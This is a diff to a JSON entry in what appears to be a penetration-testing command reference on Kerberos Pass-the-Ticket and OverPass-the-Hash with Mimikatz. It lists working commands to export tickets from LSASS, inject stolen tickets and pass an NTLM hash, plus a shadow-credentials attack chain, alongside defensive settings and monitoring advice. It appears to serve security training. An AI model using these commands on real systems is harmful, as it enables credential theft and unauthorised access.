@@ -1,7 +1,7 @@
 {
   "id": "mimikatz-ptt",
   "name": "Mimikatz - Pass the Ticket / OverPass the Hash",
-  "command": "kerberos::ptt <ticket.kirbi>",
+  "command": "kerberos::ptt <ticket>",
   "description": "Injects Kerberos tickets into the current session on Windows. Export tickets with sekurlsa::tickets /export, or dump keys with sekurlsa::ekeys, then either import a .kirbi (ptt) or forge a TGT from a key/hash (OverPass the Hash via sekurlsa::pth).",
   "platform": "windows",
   "requires": [
@@ -46,11 +46,11 @@
       "command": "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f"
     },
     {
-      "label": "Ch23 \u2014 export all tickets to .kirbi files (PEN-200 pattern: steal dave's cifs ticket)",
+      "label": "Ch23 — export all tickets to .kirbi files (PEN-200 pattern: steal dave's cifs ticket)",
       "command": "sekurlsa::tickets /export"
     },
     {
-      "label": "Ch23 \u2014 inject a stolen .kirbi ticket into current session then verify with klist",
+      "label": "Ch23 — inject a stolen .kirbi ticket into current session then verify with klist",
       "command": "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi"
     }
   ],
@@ -86,10 +86,6 @@
       "command": "privilege::debug\nsekurlsa::ekeys"
     },
     {
-      "label": "Inject Ticket",
-      "command": "kerberos::ptt <ticket.kirbi>"
-    },
-    {
       "label": "OverPass the Hash",
       "command": "sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<nt_hash>"
     }
@@ -114,5 +110,6 @@
     "misconfiguration": "Pass-the-Certificate (PtC) attacks exploit ADCS certificate abuse (ESC1/ESC8) combined with Kerberos PKINIT. Shadow credentials (pywhisker) exploit write access to msDS-KeyCredentialLink to add a certificate-based authentication mechanism to any account. Pass-the-Ticket works because Kerberos tickets are extractable from LSASS memory.",
     "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
     "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
-  }
+  },
+  "type": "command"
 }
